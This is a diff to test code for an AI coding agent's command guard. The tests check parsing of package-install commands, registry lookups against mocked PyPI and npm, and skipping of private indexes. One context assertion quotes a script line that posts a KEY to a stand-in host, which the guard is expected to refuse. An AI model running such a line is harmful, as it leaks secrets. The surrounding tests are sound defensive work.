@@ -5,24 +5,29 @@ from __future__ import annotations
 
 import asyncio
 from collections.abc import Mapping
+from datetime import UTC, datetime, timedelta
 from pathlib import Path, PurePosixPath
 
+import httpx
 import pytest
 
 from intern import hooks as h
 from intern.decisions import Answer, Answers, ChoiceAnswer, NoulAnswer, Question
 from intern.events import Decision, ToolGuard
 from intern.executor import ExecResult
+from intern.extensions import guard_packages
 from intern.extensions.guard import (
     RISK,
     Guard,
     Scope,
     judgement_state,
     needs_judgement,
+    parse_shell,
     rule_hits,
     scripts_run,
     verdict,
 )
+from intern.extensions.guard_packages import PackageFacts, Registries
 from intern.journal import MessageEntry
 from intern.messages import JsonObject, ToolCall, ToolResult, ToolResultMessage
 from intern.providers.fake import Turn
@@ -288,6 +293,41 @@ def test_the_scripts_a_command_runs_are_found_to_show_system1(command: str, scri
     assert scripts_run(command, SCOPE) == [CWD / s for s in scripts]  # an absolute path stays itself
 
 
+def installed(command: str) -> list[tuple[str, str]]:
+    found = guard_packages.installs(c for p in parse_shell(command, SCOPE) for c in p)
+    return [(i.ecosystem, name) for i in found if not i.elsewhere for name in i.names]
+
+
+@pytest.mark.parametrize(
+    ("command", "packages"),
+    [
+        ("pip install 'fastapi[standard]>=0.110' Typing_Extensions==4.12", ["fastapi", "typing-extensions"]),
+        ("pip3 install -U --no-cache-dir -c constraints.txt requests", ["requests"]),
+        ("python3 -m pip install --user httpx", ["httpx"]),
+        ("uv pip install -p 3.12 polars", ["polars"]),
+        ("uv add --group dev pytest-xdist", ["pytest-xdist"]),
+        ("poetry add pendulum@^2.0 -G test", ["pendulum"]),
+        ("pipx install black", ["black"]),
+        ("uv tool install --with mkdocs-material mkdocs", ["mkdocs-material", "mkdocs"]),
+        ("cd web && npm install lodash@^4 @types/node --save-dev", ["lodash", "@types/node"]),
+        ("npm i -g typescript && pnpm add -D vitest && yarn add react-dom", ["typescript", "vitest", "react-dom"]),
+        ("bun add zod", ["zod"]),
+        ("npm install my-alias@npm:real-pkg@1", ["real-pkg"]),
+        ("cargo add serde --features derive && cargo install ripgrep@14", ["serde", "ripgrep"]),
+        ("gem install rails -v 7.1", ["rails"]),
+        # What files name, paths, archives, URLs, repositories, curated system packages, and no names at all.
+        ("pip install -r requirements.txt && pip install -e . && pip install ./dist/a-1.0-py3-none-any.whl", []),
+        ("pip install git+https://github.com/a/b.git https://x.io/b.tar.gz 'c @ https://x.io/c.zip'", []),
+        ("npm install && npm ci && npm install ./local-pkg user/repo github:user/repo", []),
+        ("cargo install --path . && gem install ./x.gem && apt-get install -y jq && brew install jq", []),
+        # Another index or registry: its names are kept off the public registries.
+        ("pip install -i https://pypi.corp/simple foo && npm install --registry=https://npm.corp bar", []),
+    ],
+)
+def test_install_commands_name_the_packages_they_fetch_from_a_registry(command: str, packages: list[str]):
+    assert [name for _, name in installed(command)] == packages
+
+
 def test_system1_sees_requests_and_the_call_only():
     state = judgement_state(TOOLS["bash"], {"command": "git push -f"}, ["fix the bug", "now push it"], SCOPE)
     assert "fix the bug" in state and "now push it" in state
@@ -460,6 +500,63 @@ async def test_system1_sees_what_a_script_the_call_runs_holds_wherever_it_lives(
     (state,) = system1.guard_states
     assert "urlopen('https://x.io', data=KEY)" in state  # judged on what it runs, not on its name
     assert results(harness)[0].status == "refused"
+
+
+class FakeRegistries:
+    """The public registries, answered locally: every package exists, nine days old with one release."""
+
+    def __init__(self) -> None:
+        self.asked: list[str] = []
+        published = (datetime.now(UTC) - timedelta(days=9)).isoformat()
+        self.pypi = {"releases": {"0.1.0": [{"upload_time_iso_8601": published}]}}
+        self.npm = {"time": {"created": published}, "versions": {"0.1.0": {}}}
+
+    def handle(self, request: httpx.Request) -> httpx.Response:
+        self.asked.append(f"{request.url.host}{request.url.path}")
+        if request.url.host == "api.npmjs.org":
+            return httpx.Response(200, json={"downloads": 12})
+        return httpx.Response(200, json=self.pypi if request.url.host == "pypi.org" else self.npm)
+
+    def guard(self) -> Guard:
+        return Guard(registries=Registries(transport=httpx.MockTransport(self.handle)))
+
+
+async def test_packages_the_manifests_list_are_not_looked_up_and_the_rest_reach_system1_with_their_facts(
+    make_harness,
+):
+    registries = FakeRegistries()
+    system1 = ScriptedBackend({"runs_untrusted_code": 0.9, "routine": 0.1}, asked=0.05)  # nothing gets installed
+    command = "pip install fastjsonx requests-toolbelt && npm install lodash left-pad"
+    harness = make_harness([bash(command), Turn(text="Done.")], system1=system1, extensions=[registries.guard()])
+    (harness.cwd / "pyproject.toml").write_text('[project]\nname = "app"\ndependencies = ["FastJSONx>=1.2"]\n')
+    (harness.cwd / "package.json").write_text('{"dependencies": {"lodash": "^4.17.21", "left-pad-ts": "^1"}}\n')
+    await harness.run("add retries to the client")
+    assert registries.asked == [
+        "pypi.org/pypi/requests-toolbelt/json",
+        "registry.npmjs.org/left-pad",
+        "api.npmjs.org/downloads/point/last-week/left-pad",
+    ]
+    (state,) = system1.guard_states
+    looked_up = PackageFacts(ecosystem="pypi", name="requests-toolbelt", age_days=9, releases=1)
+    assert looked_up.describe() in state
+    assert PackageFacts(ecosystem="pypi", name="fastjsonx", listed=True).describe() in state
+
+
+async def test_installs_from_another_index_or_registry_are_not_looked_up(make_harness, monkeypatch):
+    registries = FakeRegistries()
+    system1 = ScriptedBackend({"runs_untrusted_code": 0.9, "routine": 0.1}, asked=0.05)
+    script = [
+        bash("pip install --extra-index-url https://pypi.corp/simple corp-utils"),
+        bash("PIP_INDEX_URL=https://pypi.corp/simple pip install corp-utils"),
+        bash("npm install @corp/ui && cargo add corp-crate"),  # the project's .npmrc, the environment
+        Turn(text="Done."),
+    ]
+    harness = make_harness(script, system1=system1, extensions=[registries.guard()])
+    (harness.cwd / ".npmrc").write_text("@corp:registry=https://npm.corp.example/\n")
+    monkeypatch.setenv("CARGO_REGISTRIES_CORP_INDEX", "sparse+https://crates.corp.example/")
+    await harness.run("wire the shared corp packages into the app")
+    assert len(system1.guard_states) == 3
+    assert registries.asked == []
 
 
 async def test_system1_lets_through_what_the_user_asked_for(make_harness):
